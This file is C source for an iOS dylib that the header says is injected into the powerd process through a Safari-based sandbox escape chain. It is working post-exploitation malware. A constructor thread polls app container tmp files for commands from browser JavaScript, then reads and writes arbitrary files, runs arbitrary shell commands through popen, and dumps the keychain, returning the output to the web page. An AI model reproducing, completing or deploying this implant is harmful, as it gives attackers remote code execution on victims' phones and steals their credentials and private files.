/*
 * nb_daemon.c — powerd 进程 IPC 守护进程
 *
 * 功能：在 powerd 进程中监听 /tmp/nb_cmd 文件，读取 Safari JS 写入的命令，
 *       执行后把结果写到 /tmp/nb_result。Safari JS 轮询读取结果。
 *
 * 编译：xcrun -sdk iphoneos clang -arch arm64e -shared -o nb_daemon.dylib nb_daemon.c -framework Foundation
 * 签名：ldid -S nb_daemon.dylib
 *
 * 命令协议（文本，每行一条）：
 *   PING                          → OK|pong
 *   READ_FILE|<path>             → OK|<base64 data> 或 ERROR|<msg>
 *   LIST_DIR|<path>              → OK|<entry1\nentry2\n...>
 *   WRITE_FILE|<path>|<base64>   → OK|<bytes_written> 或 ERROR|<msg>
 *   STAT|<path>                  → OK|<size>|<mode>|<uid> 或 ERROR|<msg>
 *   EXEC|<cmd>                   → OK|<exit_code>|<stdout base64>
 *   KEYCHAIN|<domain>            → OK|<base64 data> 或 ERROR|<msg>
 *
 * 加载方式：由 group.html 的 Stage3 用 sandboxEscape.Ad() 加载到 powerd 进程，
 *          与 bootstrap.dylib 相同的加载机制。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <glob.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dispatch/dispatch.h>

/* [container] 不写 /tmp（WebContent 无权限）；改为扫描各大 App 容器的 tmp/ */
#define CMD_BASENAME   "nb_cmd"
#define RES_BASENAME   "nb_result"
#define GLOB_PATTERN   "/private/var/mobile/Containers/Data/Application/*/tmp/nb_cmd"
#define POLL_MS        200
#define MAX_BUF     262144  /* 256KB */

/* 全局结果缓冲区 */
static char g_result[MAX_BUF];
static char g_cmd_buf[MAX_BUF];

/* ── Base64 编解码（避免二进制数据传输问题）── */

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(const unsigned char *src, int len, char *dst) {
    int i, j = 0;
    for (i = 0; i < len - 2; i += 3) {
        dst[j++] = b64_table[(src[i] >> 2) & 0x3F];
        dst[j++] = b64_table[((src[i] & 0x3) << 4) | ((src[i+1] >> 4) & 0xF)];
        dst[j++] = b64_table[((src[i+1] & 0xF) << 2) | ((src[i+2] >> 6) & 0x3)];
        dst[j++] = b64_table[src[i+2] & 0x3F];
    }
    int rem = len - i;
    if (rem == 1) {
        dst[j++] = b64_table[(src[i] >> 2) & 0x3F];
        dst[j++] = b64_table[(src[i] & 0x3) << 4];
        dst[j++] = '=';
        dst[j++] = '=';
    } else if (rem == 2) {
        dst[j++] = b64_table[(src[i] >> 2) & 0x3F];
        dst[j++] = b64_table[((src[i] & 0x3) << 4) | ((src[i+1] >> 4) & 0xF)];
        dst[j++] = b64_table[(src[i+1] & 0xF) << 2];
        dst[j++] = '=';
    }
    dst[j] = '\0';
    return j;
}

static int base64_decode(const char *src, int len, unsigned char *dst) {
    int i, j = 0;
    int v[4];
    for (i = 0; i < len; i += 4) {
        int k;
        for (k = 0; k < 4 && i + k < len; k++) {
            char c = src[i + k];
            if (c >= 'A' && c <= 'Z') v[k] = c - 'A';
            else if (c >= 'a' && c <= 'z') v[k] = c - 'a' + 26;
            else if (c >= '0' && c <= '9') v[k] = c - '0' + 52;
            else if (c == '+') v[k] = 62;
            else if (c == '/') v[k] = 63;
            else if (c == '=') v[k] = -1;
            else return -1;
        }
        for (; k < 4; k++) v[k] = 0;
        if (v[0] < 0 || v[1] < 0) break;
        dst[j++] = (v[0] << 2) | (v[1] >> 4);
        if (v[2] < 0) break;
        dst[j++] = ((v[1] & 0xF) << 4) | (v[2] >> 2);
        if (v[3] < 0) break;
        dst[j++] = ((v[2] & 0x3) << 6) | v[3];
    }
    return j;
}

/* ── 工具函数 ── */

/* 当前正在处理的命令文件路径（结果写回同一目录的 nb_result） */
static char g_cur_cmd_path[1200];
static char g_cur_res_path[1200];

static void write_result(const char *result) {
    if (g_cur_res_path[0] == 0) return;
    int fd = open(g_cur_res_path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) {
        ssize_t off = 0, n;
        size_t len = strlen(result);
        while (off < (ssize_t)len && (n = write(fd, result + off, len - off)) > 0) off += n;
        close(fd);
    }
}

/* ── 命令处理 ── */

static void cmd_ping(void) {
    write_result("OK|pong");
}

static void cmd_read_file(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|open %s: %s", path, strerror(errno));
        write_result(msg);
        return;
    }
    /* 先读原始数据到临时缓冲区 */
    unsigned char *raw = (unsigned char *)malloc(MAX_BUF / 2);
    if (!raw) {
        close(fd);
        write_result("ERROR|malloc failed");
        return;
    }
    ssize_t total = 0;
    ssize_t n;
    while (total < MAX_BUF / 2 - 1 &&
           (n = read(fd, raw + total, MAX_BUF / 2 - 1 - total)) > 0) {
        total += n;
    }
    close(fd);

    if (total < 0) {
        free(raw);
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|read %s: %s", path, strerror(errno));
        write_result(msg);
        return;
    }

    /* Base64 编码 */
    char *encoded = (char *)malloc(MAX_BUF);
    if (!encoded) {
        free(raw);
        write_result("ERROR|malloc failed");
        return;
    }
    int enc_len = base64_encode(raw, (int)total, encoded);
    free(raw);

    /* 结果：OK|<size>|<base64> */
    snprintf(g_result, MAX_BUF, "OK|%zd|%s", total, encoded);
    free(encoded);
    write_result(g_result);
}

static void cmd_list_dir(const char *path) {
    DIR *d = opendir(path);
    if (!d) {
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|opendir %s: %s", path, strerror(errno));
        write_result(msg);
        return;
    }

    int offset = 0;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
        int entry_len = (int)strlen(entry->d_name);
        /* 格式：name|type\n  type: 8=file, 4=dir, 2=char, 6=block, 10=link, 12=sock */
        if (offset + entry_len + 8 < MAX_BUF - 1) {
            offset += snprintf(g_result + offset, MAX_BUF - offset,
                             "%s|%d\n", entry->d_name, entry->d_type);
        }
    }
    closedir(d);

    if (offset == 0) {
        strcpy(g_result, "OK|");
    }
    /* 确保 null 终止 */
    g_result[offset] = '\0';
    /* 前面加 OK| */
    char final[MAX_BUF];
    snprintf(final, MAX_BUF, "OK|%s", g_result);
    write_result(final);
}

static void cmd_write_file(const char *path, const char *b64_data) {
    int data_len = (int)strlen(b64_data);
    unsigned char *raw = (unsigned char *)malloc(data_len);
    if (!raw) {
        write_result("ERROR|malloc failed");
        return;
    }
    int raw_len = base64_decode(b64_data, data_len, raw);
    if (raw_len < 0) {
        free(raw);
        write_result("ERROR|base64 decode failed");
        return;
    }

    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd < 0) {
        free(raw);
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|open %s: %s", path, strerror(errno));
        write_result(msg);
        return;
    }
    ssize_t written = write(fd, raw, raw_len);
    close(fd);
    free(raw);

    if (written < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|write %s: %s", path, strerror(errno));
        write_result(msg);
        return;
    }
    snprintf(g_result, MAX_BUF, "OK|%zd", written);
    write_result(g_result);
}

static void cmd_stat(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|stat %s: %s", path, strerror(errno));
        write_result(msg);
        return;
    }
    snprintf(g_result, MAX_BUF, "OK|%lld|%o|%d|%d",
             (long long)st.st_size, st.st_mode, st.st_uid, st.st_gid);
    write_result(g_result);
}

static void cmd_exec(const char *cmd_str) {
    FILE *fp = popen(cmd_str, "r");
    if (!fp) {
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|popen: %s", strerror(errno));
        write_result(msg);
        return;
    }
    unsigned char *raw = (unsigned char *)malloc(MAX_BUF / 2);
    if (!raw) {
        pclose(fp);
        write_result("ERROR|malloc failed");
        return;
    }
    size_t total = fread(raw, 1, MAX_BUF / 2 - 1, fp);
    int exit_code = pclose(fp);

    char *encoded = (char *)malloc(MAX_BUF);
    if (!encoded) {
        free(raw);
        write_result("ERROR|malloc failed");
        return;
    }
    int enc_len = base64_encode(raw, (int)total, encoded);
    free(raw);

    snprintf(g_result, MAX_BUF, "OK|%d|%s", exit_code, encoded);
    free(encoded);
    write_result(g_result);
}

static void cmd_keychain(const char *domain) {
    /* keychain 读取：用 security 命令 */
    char cmd[512];
    if (!domain || strlen(domain) == 0) {
        domain = "default";
    }
    snprintf(cmd, sizeof(cmd), "/usr/bin/security dump-keychain %s 2>&1",
             strcmp(domain, "default") == 0 ? "" : domain);
    cmd_exec(cmd);
}

/* ── 命令分发 ── */

static void process_command(const char *cmd_line) {
    /* 复制到可修改的缓冲区 */
    strncpy(g_cmd_buf, cmd_line, MAX_BUF - 1);
    g_cmd_buf[MAX_BUF - 1] = '\0';

    /* 去掉末尾换行 */
    int len = (int)strlen(g_cmd_buf);
    while (len > 0 && (g_cmd_buf[len-1] == '\n' || g_cmd_buf[len-1] == '\r')) {
        g_cmd_buf[--len] = '\0';
    }
    if (len == 0) {
        write_result("ERROR|empty command");
        return;
    }

    /* 解析命令类型 */
    char *cmd_type = strtok(g_cmd_buf, "|");
    char *arg1 = strtok(NULL, "|");
    char *arg2 = strtok(NULL, "|");

    if (!cmd_type) {
        write_result("ERROR|no command type");
        return;
    }

    if (strcmp(cmd_type, "PING") == 0) {
        cmd_ping();
    } else if (strcmp(cmd_type, "READ_FILE") == 0) {
        if (arg1) cmd_read_file(arg1);
        else write_result("ERROR|READ_FILE needs path");
    } else if (strcmp(cmd_type, "LIST_DIR") == 0) {
        if (arg1) cmd_list_dir(arg1);
        else write_result("ERROR|LIST_DIR needs path");
    } else if (strcmp(cmd_type, "WRITE_FILE") == 0) {
        if (arg1 && arg2) cmd_write_file(arg1, arg2);
        else write_result("ERROR|WRITE_FILE needs path and data");
    } else if (strcmp(cmd_type, "STAT") == 0) {
        if (arg1) cmd_stat(arg1);
        else write_result("ERROR|STAT needs path");
    } else if (strcmp(cmd_type, "EXEC") == 0) {
        if (arg1) cmd_exec(arg1);
        else write_result("ERROR|EXEC needs command");
    } else if (strcmp(cmd_type, "KEYCHAIN") == 0) {
        cmd_keychain(arg1);  /* arg1 可以为 NULL */
    } else {
        char msg[256];
        snprintf(msg, sizeof(msg), "ERROR|unknown command: %s", cmd_type);
        write_result(msg);
    }
}

/* ── 容器轮询（替代 /tmp VNODE 监听） ── */

#include <pthread.h>

typedef struct {
    char path[1200];
    off_t size;
    time_t mtime;
} seen_t;

static seen_t g_seen[8];
static int g_seen_n = 0;

static int seen_should_fire(const char *path, off_t size, time_t mtime) {
    for (int i = 0; i < g_seen_n; i++) {
        if (strcmp(g_seen[i].path, path) == 0) {
            if (g_seen[i].size == size && g_seen[i].mtime == mtime) return 0;
            g_seen[i].size = size;
            g_seen[i].mtime = mtime;
            return 1;
        }
    }
    if (g_seen_n < (int)(sizeof(g_seen) / sizeof(g_seen[0]))) {
        snprintf(g_seen[g_seen_n].path, sizeof(g_seen[g_seen_n].path), "%s", path);
        g_seen[g_seen_n].size = size;
        g_seen[g_seen_n].mtime = mtime;
        g_seen_n++;
    }
    return 1;
}

static void handle_one(const char *cmd_path) {
    struct stat st;
    if (stat(cmd_path, &st) != 0) return;
    if (st.st_size <= 0) return;
    if (!seen_should_fire(cmd_path, st.st_size, st.st_mtime)) return;

    snprintf(g_cur_cmd_path, sizeof(g_cur_cmd_path), "%s", cmd_path);
    snprintf(g_cur_res_path, sizeof(g_cur_res_path), "%s", cmd_path);
    char *slash = strrchr(g_cur_res_path, '/');
    if (!slash) return;
    snprintf(slash + 1, sizeof(g_cur_res_path) - (size_t)(slash + 1 - g_cur_res_path), "%s", RES_BASENAME);

    int fd = open(cmd_path, O_RDONLY);
    if (fd < 0) return;
    char *buf = malloc(MAX_BUF);
    if (!buf) { close(fd); return; }
    ssize_t n = read(fd, buf, MAX_BUF - 1);
    close(fd);
    if (n > 0) {
        buf[n] = 0;
        process_command(buf);
    }
    free(buf);

    int tf = open(cmd_path, O_WRONLY | O_TRUNC, 0666);
    if (tf >= 0) close(tf);
}

static void *poll_thread(void *arg) {
    (void)arg;
    for (;;) {
        glob_t g;
        memset(&g, 0, sizeof(g));
        if (glob(GLOB_PATTERN, 0, NULL, &g) == 0) {
            for (size_t i = 0; i < g.gl_pathc; i++) handle_one(g.gl_pathv[i]);
        }
        globfree(&g);
        usleep(POLL_MS * 1000);
    }
    return NULL;
}

__attribute__((constructor))
static void nb_daemon_init(void) {
    pthread_t th;
    if (pthread_create(&th, NULL, poll_thread, NULL) != 0) return;
    pthread_detach(th);
}
